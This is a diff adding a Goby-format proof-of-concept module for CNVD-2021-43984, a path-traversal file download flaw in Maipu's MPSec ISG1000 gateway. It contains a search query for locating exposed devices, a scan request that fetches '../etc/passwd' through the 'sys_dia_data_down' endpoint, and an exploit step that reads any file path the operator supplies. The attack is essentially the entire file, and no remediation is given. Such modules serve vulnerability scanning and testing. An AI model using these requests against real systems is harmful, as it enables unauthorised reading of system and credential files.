@@ -1,0 +1,99 @@
+{
+      "Name": "MPSec ISG1000 Gateway Filedownload CNVD-2021-43984",
+      "Level": "1",
+      "Tags": [
+            "filedownload"
+      ],
+      "GobyQuery": "title=\"迈普通信技术股份有限公司\"",
+      "Description": "Founded in 1993, Maipu Communication Technology Co., Ltd. is a leading supplier of network products and solutions in China.",
+      "Product": "MPSec ISG1000",
+      "Homepage": "http://www.maipu.cn/",
+      "Author": "",
+      "Impact": "MPSec ISG1000 Gateway Filedownload CNVD-2021-43984.",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2021-43984"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Cmd",
+                  "Type": "input",
+                  "Value": "../etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/webui/?g=sys_dia_data_down&file_name=../etc/passwd",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/webui/?g=sys_dia_data_down&file_name={{{Cmd}}}",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
